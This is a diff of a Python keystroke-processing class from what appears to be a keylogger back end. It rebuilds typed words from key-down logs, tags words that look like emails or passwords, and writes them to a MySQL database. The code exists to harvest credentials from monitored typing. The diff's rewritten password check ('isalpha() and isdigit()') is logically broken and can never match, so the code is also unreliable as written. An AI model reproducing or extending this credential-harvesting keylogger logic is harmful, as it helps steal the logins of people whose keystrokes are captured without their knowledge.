@@ -14,7 +14,12 @@ class Process:
             "isPassword": 0
         }
         self.cfg = load_cfg('./main_cfg.json')
-        
+    
+    #######################################
+    #                                     
+    #         Key Processing           
+    #                                     
+    #######################################
     def addKey(self, data):
         payload = json.loads(data)
         self.pushDB_keys(payload)
@@ -41,6 +46,12 @@ class Process:
         db.close()
         
         return 0
+        
+    #######################################
+    #                                     
+    #         Words Processing           
+    #                                     
+    #######################################
     
     def appendWord(self,data):
     #loop through items in log and append characters on key-down
@@ -52,27 +63,27 @@ class Process:
             self.word += data['processedKey']
         else:
             #TODO: if last word, add the time pressed as end time
-            print("words: "+ self.payload['processedWord'])
             self.payload['processedWord'] = self.word
             self.resetWord()
             self.checkEmailPassword()
             self.pushDB_word()
             
         return 0
-                
+        
+    ###################################            
+    #   For email: check if string contains "@"     
+    #   For password: check if string is a mix of alphabet and numbers     
+    ###################################
     def checkEmailPassword(self):
-    #check the processedWord of the payload to determine if possible email or password
         check_word = self.payload['processedWord']
         if "@" in check_word:
             self.payload['isEmail'] = 1
         
-        elif (not check_word.isalpha() and not check_word.isdigit()):
-            #a high level filtering for words which are a mix of alphabet and digits, suggesting they are possible passwords
+        elif (check_word.isalpha() and check_word.isdigit() and check_word != ""):
             self.payload['isPassword'] = 1
             
-    
+
     def pushDB_word(self):
-    #push to table words
         db = mysql.connector.connect (
             host=self.cfg['dbHost'],
             port=self.cfg['port'],
